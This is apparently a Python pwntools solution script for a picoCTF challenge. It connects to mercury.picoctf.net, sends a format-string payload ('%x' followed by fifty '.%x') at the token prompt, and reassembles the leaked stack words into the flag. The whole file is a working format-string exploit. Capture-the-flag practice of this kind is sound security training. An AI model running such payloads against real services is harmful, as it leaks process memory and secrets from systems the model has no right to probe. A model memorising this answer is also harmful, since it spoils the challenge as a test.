import pwn
from pwn import *

p = pwn.remote("mercury.picoctf.net", 6989)
p.recvuntil(b"portfolio\n")
p.sendline(b"1")
p.recvuntil(b"token?\n")
p.sendline("%x" + ".%x"*50) # Input format string attack here
print(p.recvline())
x = p.recvline() # Result back here
s = x[:-1].decode().split(".")

res = ""
for hex in s:
    if len(hex) == 8:
        b = bytearray.fromhex(hex)
        try:
            res += b.decode()[::-1]
        except:
            # Do nothing
            pass
print(res + "}")



